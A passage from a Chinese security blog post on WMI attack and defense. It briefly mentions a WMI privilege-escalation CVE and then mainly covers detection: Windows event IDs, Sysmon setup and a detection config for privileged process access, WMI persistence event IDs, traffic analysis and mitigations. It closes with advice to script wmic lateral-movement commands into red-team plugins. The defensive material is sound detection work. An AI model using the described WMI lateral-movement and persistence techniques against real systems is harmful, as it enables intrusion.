**简单的来说就是WMI未能做好进程之间使用的帐户（特指NetworkService和LocalService帐户）隔离，而导致可以利用这一特性来进行提权。**  
 **笔者未能复现**

###  本文参考文章：

  * [CVE-2009-0078](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-0078)
  * [WMI服务隔离本地提权漏洞](https://www.anquanke.com/vul/id/1117574)

## WMI攻击检测

###  讲在前面：

无论何种攻击手法在日志或流量是都会留下一定的痕迹，但是使用何种的规则将其监控到，这是令防守方头大的问题。WMI横向移动、权限维持都会在日志监控到。至于如何制定规则，本文不展开。  
 **总之两点：**

  * 做好 WMI 连接的网络流量监控，一般不使用 WMI 的环境若出现了使用 WMI的情况，则内部网络可能已经被入侵。
  * 做好进程监控，监测”wmic.exe“的命令行参数及其执行的命令。

###  日志检测

> ***注意**
> ：在日志检测中，最重要的数据来源就是Windows日志，而Windows日志也不是说全部选项都开启就可以，因为必须要考虑到机器本身的性能，很多无关紧要的日志数据我们可以将其监控选项关闭。*

**Windows EventLog**

Windows中对于WMIC的检测有两个关键日志：

  * EventCode 4648 — 尝试使用显式凭据登录
  * EventCode 4688 / SysmonID​​ 1 — 进程创建 (wmic.exe)

wmic执行命令  
在域内客户机上执行wmic远程命令

wmic创建事件  
当创建wmi事件时出现了4648和4688日志

4648日志出现，调用程序svchost.exe

当wmic执行时，以上述例子为例，可以看到命令执行成功前后出现了3个日志，这也和wmic的执行流程有关，我们可以参考下图：

上图咱们可以结合WMI讲解篇进行理解，WMIC操作时会先由svchost.exe调用WmiPrvSE.exe然后由WmiPrvSE调用指定的程序，指定的cmd则由cmd.exe进行下一步操作，指定的powershell则有powershell.exe进行下一步操作。

**Sysmon**

> ***注意**
> ：Sysmon是微软对于Eventlog的补充解决方案，这是笔者对于Sysmon的理解，Sysmon可以能够获取到Evenlog获取不到的更多信息，MS解释Sysmon。*
    
    
    sysmon64.exe -i exampleSysmonConfig.xml       //执行安装：
    sysmon64.exe -u                               //删除
    

执行安装

删除

> ***注意** ：exampleSysmonConfig.xml为Sysmon的配置文件，内容和名字均可以自定义，内容可以自行进行增加或修改。*
    
    
    <Sysmon schemaversion="4.40">
    <EventFiltering>
      <!-- Restrict logging to access targeting svchost.exe and verclsid.exe -->
      <ProcessAccess onmatch="exclude">
        <TargetImage condition="excludes">verclsid.exe</TargetImage>
        <TargetImage condition="excludes">svchost.exe</TargetImage>
      </ProcessAccess>
      <!-- Process access requests with suspect privileged access,
           or call trace indicative of unknown modules -->
         <ProcessAccess onmatch="include">
             <GrantedAccess condition="is">0x1F0FFF</GrantedAccess>
             <GrantedAccess condition="is">0x1F1FFF</GrantedAccess>
             <GrantedAccess condition="is">0x1F2FFF</GrantedAccess>
             <GrantedAccess condition="is">0x1F3FFF</GrantedAccess>
             <GrantedAccess condition="is">0x1FFFFF</GrantedAccess>
             <CallTrace condition="contains">unknown</CallTrace>
         </ProcessAccess>
    </EventFiltering>
    </Sysmon>
    

***参考配置文件** ：[sysmonconfig-
export.xml](https://github.com/SwiftOnSecurity/sysmon-
config/blob/master/sysmonconfig-export.xml) _  
 _*Powershell查看Sysmon日志__

    
    
    Get-WinEvent -LogName Microsoft-Windows-Sysmon/Operational
    

**本地事件管理器：**  
Windows日志->应用程序和服务日志->Microsoft->Windows

可以看到详细的日志内容

若是需要将sysmon的日志导出则可以使用wevtutil命令：

    
    
    wevtutil query-events "Microsoft-Windows-Sysmon/Operational" /format:xml /e:sysmonview > eventlog.xml
    

然后可以自行导入sysmon帮助工具进行分析：  
[sysmontools](https://github.com/nshalabi/SysmonTools)

若是权限维持中的WMI事件，则sysmon可以关注如下四个事件ID

    
    
    Process Create(ID 1)
    WmiEventFilter(ID 19)
    WmiEventConsumer(ID 20)
    WmiEventConsumterToFilter(ID 21)
    

可以看到CommandLine中执行的命令细节

###  流量检测

我们要注意在使用PSEXEC，SC.EXE，或其他远程服务管理工具进行操作时，通信将通过MS-
SCMR协议操作DCERPC。即使该协议使用最大加密级别，但仍然可以使用流量监控确定目标执行了哪些类型的操作（例如服务创建、服务启动等）。  
下图为sc.exe 创建远程服务的 wireshark 捕获

尽管WMIC仍然基于 DCEPC，但所有 WMI DCOM
方法调用都是通过单个接口完成的，并且当与“数据包隐私”级别的加密相结合时，流量监控的解决方案只能知道调用了某些 WMI
方法。无法知道执行了那些细节操作。若通过 WINRM 协议执行时，WMI 流量看起来像 HTTP，并且再次与通过 SVCCTL 接口时完全不同。这意味着
WMI技术可以有效地规避任何流量检测其横向移动的操作。  
下图为DCEPRC数据包

###  缓解措施：

  * 限制 WinRM信任的主机数量

    
    
    winrm 设置 winrm/config/client '@{TrustedHosts="指定主机"}'
    

  * 在日志中重点监控WmiPrvSE.exe和WMIC.exe。
  * 做好高权限的控制，避免高权限帐户滥用。

###  参考文章：

  * [Windows 管理规范](https://attack.mitre.org/techniques/T1047/)
  * [WMI检测详细分析](https://threathunterplaybook.com/notebooks/windows/08_lateral_movement/WIN-200902020333.html#hunter-notes)
  * [发现横向移动](https://labs.f-secure.com/blog/attack-detection-fundamentals-discovery-and-lateral-movement-lab-5/)

## WMI（技术总结及个人建议）

###  总结：

WMI在笔者所参与的项目中发现目前攻防中利用依旧非常频繁，尤其在横向移动中，利用wmic或者powershell的WMI模块操作Win32来达到渗透的目的。笔者在学习了WMI后，将其分为四个模块（讲解、横向移动、权限维持、权限提升），并追加了小知识点的编写（WBEMTEST工具使用，普通用户使用wmic）。笔者能力有限，在几篇中若有未讲人话之处，望谅解。

###  个人建议：

实际攻防中将常用的wmic命令集成到Cna插件中，将权限维持集成到Cna插件中，wmic或powershell的WMI模块常用的记好笔记，用的时候直接复制粘贴。

本文由 **PingPig** 原创发布  
转载，请参考[转载声明](/note/repost)，注明出处：
[https://www.anquanke.com/post/id/248139](/post/id/248139)  
安全客 - 有思想的安全新媒体

[wmi](/tag/wmi) __ 赞 ( 5) __收藏

[ PingPig ](/member/160724)

分享到： ![QQ空间](https://p0.ssl.qhimg.com/sdm/28_28_100/t014ba42aad7714178d.png)
![新浪微博](https://p0.ssl.qhimg.com/sdm/28_28_100/t01f0d8694dda79069d.png)
![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
![QQ](https://p0.ssl.qhimg.com/sdm/28_28_100/t010d95bee6ba3edf60.png)
![facebook](https://p0.ssl.qhimg.com/sdm/28_28_100/t01a5e75c16cffcb0ba.png)
![twitter](https://p0.ssl.qhimg.com/sdm/28_28_100/t01fc30c819f51e9cff.png)

|推荐阅读

[ ![](https://p5.ssl.qhimg.com/sdm/229_160_100/t01e9ef10b21fb4cc07.png)

###### 分享一个最近的一次应急溯源

2021-08-09 10:30:25 ](/post/id/248890)

[ ![](https://p2.ssl.qhimg.com/sdm/229_160_100/t010500b2188e8a5018.jpg)

###### 使用PetitPotam代替Printerbug

2021-08-09 10:00:47 ](/post/id/249603)

[ ![](https://p3.ssl.qhimg.com/sdm/229_160_100/t0131c91d129ca0ed1b.png)

###### 加密固件之依据老固件进行解密

2021-08-08 12:00:10 ](/post/id/248741)

[ ![](https://p4.ssl.qhimg.com/sdm/229_160_100/t016cc852e99271d391.png)

###### JSBot无文件攻击分析

2021-08-08 10:00:56 ](/post/id/249104)

|发表评论

[ ](/member/160724)

发表评论

|评论列表

还没有评论呢，快去抢个沙发吧~

加载更多

[ ](/member/160724)

[ PingPig ](/member/160724)

是猪啊

文章

1

粉丝

2

__ 关注

## TA的文章

[WMI攻与防](/post/id/248139)

2021-08-05 15:30:17

__

### 相关文章

  * [ 分享一个最近的一次应急溯源](/post/id/248890)
  * [ 使用PetitPotam代替Printerbug](/post/id/249603)
  * [ 加密固件之依据老固件进行解密](/post/id/248741)
  * [ JSBot无文件攻击分析](/post/id/249104)
  * [ Json 编写 PoC&EXP 遇到的那些坑](/post/id/249392)

热门推荐

[ ](/post/id/162175)

##### 文章目录

讲在前面： WMI是什么 简介： WMI做什么 为什么使用WMI WMI利用（横向移动） 讲在前面： 信息收集 横向移动 部分意见 WMI利用（权限维持）
讲在前面： 什么是WMI事件 WMI永久事件 WMI利用（权限提升） 讲在前面： CVE-2009-0078 本文参考文章： WMI攻击检测 讲在前面：
日志检测 流量检测 缓解措施： 参考文章： WMI（技术总结及个人建议） 总结： 个人建议：

![安全客Logo](https://p0.ssl.qhimg.com/t0168809c9f19b4fec6.png)

[ ![安全客](https://p0.ssl.qhimg.com/t014afa383e7a786b4a.png)
](https://zhuanlan.zhihu.com/c_118578260)

[ ](https://weibo.com/360adlab)

##### 微信二维码

×

![安全客](https://p0.ssl.qhimg.com/t0151209205b47f2270.jpg)

## 安全客

  * [关于我们](/about)
  * [加入我们](/join)
  * [联系我们](/note/contact)
  * [用户协议](/note/protocol)

## 商务合作

  * [合作内容](/note/business)
  * [联系方式](/note/contact)
  * [友情链接](/link)

## 内容须知

  * [投稿须知](https://www.anquanke.com/contribute/tips)
  * [转载须知](/note/repost)
  * 官网QQ群6：785695539 
  * 官网QQ群3：830462644(已满) 
  * 官网QQ群2：814450983(已满) 
  * 官网QQ群1：702511263(已满) 

## 合作单位

  * [ ![安全客](https://p0.ssl.qhimg.com/t01592a959354157bc0.png) ](http://www.cert.org.cn/)
  * [ ![安全客](https://p0.ssl.qhimg.com/t014f76fcea94035e47.png) ](http://www.cnnvd.org.cn/)

Copyright © 北京奇虎科技有限公司 360网络攻防实验室 安全客 All Rights Reserved
[京ICP备08010314号-66](https://beian.miit.gov.cn/)

![](https://p0.ssl.qhimg.com/t0179ac3294ef926b8c.png)

